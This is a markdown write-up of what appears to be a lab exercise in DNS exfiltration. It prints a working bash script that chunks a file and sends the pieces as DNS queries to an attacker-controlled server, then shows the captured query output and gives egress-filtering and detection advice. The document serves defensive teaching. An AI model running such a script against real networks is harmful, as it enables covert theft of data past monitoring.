> Back to [case summary](README.md)

# Attack Scenario

Attacker host (Kali, `192.168.100.20`) exfiltrates a file over DNS: the file is
base64-encoded, sanitized, split into numbered chunks, and each chunk is sent as
a DNS query to a server under the attacker's control (`192.168.100.24:53`,
dnsmasq with query logging).

## Phase 1 — Tool preparation (Kali)

`exfil.sh` — bash script written for this case:

```bash
#!/bin/bash
i=0
cat secret.txt | tr '+/=' 'XXX' | fold -w 50 | while read -r c; do
dig $i.$c.exfil.lab @192.168.100.24 +time=1 +tries=1
i=$((i+1))
done
echo "sended"
```

What each stage does:

| Stage | Command | Purpose |
|---|---|---|
| read | `cat secret.txt` | the "stolen" file (~500 bytes of base64 data) |
| sanitize | `tr '+/=' 'XXX'` | replace DNS-invalid base64 chars (`+ / =`) |
| split | `fold -w 50` | cut into chunks that fit a DNS label (max 63 chars) |
| send | `dig $i.$c.exfil.lab @192.168.100.24` | one DNS query per numbered chunk |
| count | `i=$((i+1))` | sequence number, so chunks can be reassembled in order |

The file being exfiltrated:

```
o8h0OzjeFAd7nFWTjNoMOAaq5+jx6IxlnuN8jt8tNnxryOYc2/+TluWciWORtBG8bYKrhYBAj+dS0tHxesr0eWSWPcO/KSnWfI0aD3uX+HzXBe76CsLlJbC+1QtbNPK79SnNg4As8zE7Gzl19GeZItFoRzghDi+d0V3sEmND3T8ym5vj0xxGVB3F6+qUV7ETPZyCBzI/T6jo5EzevmQ9W2UBgWRJwMsRmKjP/kxB/fFX1Kxhi9n6CGmcbAE8mBG8ScNvxjQx694l+2usB0Fy7jVIH42CKeI6NXj1rqpnqg9t/e7m0Y8X0chkhK586WRw9BTQEUdQfPhJ3A23FRExd8XTrcbYvi2ZKkfy33SzdrnFrdajhL4kU9erdn5GeaKBFTmGzRunqpDRddLnyeEwk3gvfKY2lJHXKS+UdYeSwHYBG3D4wRJri+iE3Tn8CNkL5xT5rt4z+Vdl524ZRqM0ApbPl5yFdWYIDzoMl/uHCehmZ2Bs0CdviU4RwJSx3ilTFs8Gbnxnjikx7xXf9RLIWuGTDHdLK80Lt/rUMXrFZcpdbfxkh2G+LTkd87RhH1g/i0xh+wlZUXy1Rq8KH1eIdtdQnK1Nis9KZhN+SwDCBWSxqzqLpIrrxX8xaPhWNUjPB4K2EVE2BAwtS6Ex6q13mv7JnjM=
```

Note: the file content itself was produced with `head -c 500 /dev/urandom | base64 -w0`,
so the exfiltration carries base64-of-base64 — irrelevant for the mechanics, and it
makes the chunks look even more random.

## Phase 2 — Execution

```
bash exfil.sh
```

Every chunk becomes one DNS A-query. Observed output (dig), chunks 0–12 — 13 queries
in ~2 seconds. Server answers `REFUSED` (lab dnsmasq has no upstream configured) —
the queries are still logged on the receiving side, which is all the exfiltration needs:

```
;; ->>HEADER<<- opcode: QUERY, status: REFUSED, id: 60240
;; QUESTION SECTION:
;0.o8h0OzjeFAd7nFWTjNoMOAaq5Xjx6IxlnuN8jt8tNnxryOYc2X.exfil.lab. IN A
;; SERVER: 192.168.100.24#53(192.168.100.24) (UDP)
;; WHEN: Tue Nov 17 18:04:30 EST 2026
```

(Representative capture — chunks 0, 6, 12 of 13: [`iocs/dig-output.txt`](iocs/dig-output.txt); all queries share the same structure, ~2s total)

## Why it worked

**Lack of egress filtering.** The host had direct access to send UDP traffic on
port 53 toward an unauthorized server (`192.168.100.24`) without being forced
through monitored recursive resolvers.

**Insufficient DNS anomaly monitoring.** No controls were in place to detect
unusual DNS patterns — abnormally long subdomains, high entropy, base64-looking
labels — so the burst of covert queries produced zero alerts.

## Notes for the blue side

Add egress filtering (force all DNS through the internal resolver) and SIEM
detection rules for DNS anomalies — because if L1 is not monitoring
`wazuh-archives-*`, this attack stays invisible.
